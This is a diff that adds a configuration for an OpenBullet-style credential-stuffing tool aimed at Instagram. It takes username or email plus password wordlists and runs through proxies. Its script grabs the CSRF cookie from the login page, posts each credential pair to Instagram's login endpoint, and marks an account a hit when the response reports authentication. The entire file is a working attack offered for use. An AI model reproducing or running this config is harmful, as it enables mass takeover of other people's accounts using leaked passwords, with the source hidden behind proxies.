@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "instagram",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-21T12:11:32.6661165+00:00",
+  "AdditionalInfo": "",
+  "Author": "Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_Login REQUEST GET "https://www.instagram.com/accounts/login/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(csrftoken)>" LR "" "" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#POST_Login REQUEST POST "https://www.instagram.com/accounts/login/ajax/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&queryParams=%7B%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.instagram.com" 
+  HEADER "referer: https://www.instagram.com/accounts/login/" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "x-csrftoken: <TOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "authenticated\": true" 
+  KEYCHAIN Failure OR 
+    KEY "authenticated\": false" 
